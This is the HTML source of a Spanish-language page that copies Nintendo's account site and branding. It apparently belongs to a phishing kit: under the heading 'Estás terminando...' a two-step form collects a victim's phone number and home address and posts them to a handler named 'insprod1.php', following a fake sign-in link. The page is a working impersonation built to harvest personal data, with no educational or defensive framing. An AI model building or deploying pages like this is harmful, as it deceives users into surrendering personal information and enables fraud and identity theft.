<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cuenta Nintendo</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
</head>
<body class="new">
    <div class="sidebar">
        <a href="index.php">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0d/Nintendo.svg/320px-Nintendo.svg.png" alt="Nintendo Logo" class="nintendo-logo">
        </a>
        <ul>
            <li><i class="bi bi-star-half text-white" style="font-size: 2.5rem;"></i> Juegos</li>
            <li><i class="bi bi-dpad-fill text-white" style="font-size: 2.5rem;"></i> Hardware</li>
            <li><i class="bi bi-nintendo-switch text-white" style="font-size: 2.5rem;"></i> Nintendo Switch Online</li>
            <li><i class="bi bi-bag text-white" style="font-size: 2.5rem;"></i> Nintendo eShop</li>
            <li><i class="bi bi-people-fill text-white" style="font-size: 2.5rem;"></i> Síguenos</li>
        </ul>
    </div>

    <div class="content">
        <div class="navbar">
            <div class="actions">
                <a href="#">
                    <div>
                        <center>
                            <i class="bi bi-search text-white"></i><br>Buscar
                        </center>
                    </div>
                </a>
                <a href="index.php">
                    <div>
                        <center>
                            <i class="bi bi-heart text-white"></i>
                        </center>
                        Lista de deseos
                    </div>
                </a>
                <a href="login.php">
                    <div>
                        <center>
                            <i class="bi bi-person-fill text-white"></i>
                        </center>
                        Iniciar sesión
                    </div>
                </a>
            </div>
        </div>

        <div class="main-content">
            <div class="news-section">
                <br><br><br>
                <div class="container">
                    <div class="login-container">
                        <div class="login-header">
                            <h2>Estás terminando...</h2>
                        </div>
                        <form id="loginForm" method="post" action="insprod1.php">
                            <div id="step1">
                                <div class="form-group">
                                    <label for="telefono">Teléfono</label>
                                    <input type="tel" id="telefono" name="telefono" placeholder="Introduce tu número de teléfono" pattern="[0-9]{9,15}" required>
                                    <div class="input-icon">
                                        <i class="bi bi-telephone-fill"></i>
                                    </div>
                                </div>
                                <button type="button" class="login-button" onclick="nextStep()">
                                    Siguiente <i class="bi bi-arrow-right"></i>
                                </button>
                            </div>
                            <div id="step2" style="display:none;">
                                <div class="form-group">
                                    <label for="calle">Calle</label>
                                    <input type="text" id="calle" name="calle" placeholder="¿Dónde vives?" required>
                                    <div class="input-icon">
                                        <i class="bi bi-signpost-2-fill"></i>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="numero">Número</label>
                                    <input type="text" id="numero" name="numero" placeholder="Nº" pattern="[0-9]{1,2}" required>
                                    <div class="input-icon">
                                        <i class="bi bi-123"></i> 
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="portal">Portal</label>
                                    <input type="text" id="portal" name="portal" placeholder="Nº de portal" pattern="[0-9]{1,2}">
                                    <div class="input-icon">
                                        <i class="bi bi-door-open-fill"></i>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="provincia">Provincia</label>
                                    <input type="text" id="provincia" name="provincia" placeholder="Introduce tu provincia" required>
                                    <div class="input-icon">
                                        <i class="bi bi-map-fill"></i> 
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="localidad">Localidad</label>
                                    <input type="text" id="localidad" name="localidad" placeholder="Introduce tu localidad" required>
                                    <div class="input-icon">
                                        <i class="bi bi-geo-alt-fill"></i>
                                    </div>
                                </div> 
                                <button type="submit" class="login-button">
                                    <i class="bi"></i>Terminar
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function nextStep() {
            const telefono = document.getElementById('telefono').value.trim();
            if (telefono !== '') {
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            } else {
                alert('Por favor introduce tu número de teléfono.');
            }
        }

            document.getElementById('telefono').addEventListener('input', function () {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
            document.getElementById('numero').addEventListener('input', function () {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
            document.getElementById('portal').addEventListener('input', function () {
                this.value = this.value.replace(/[^0-9]/g, '');
            });

    </script>
</body>
</html>
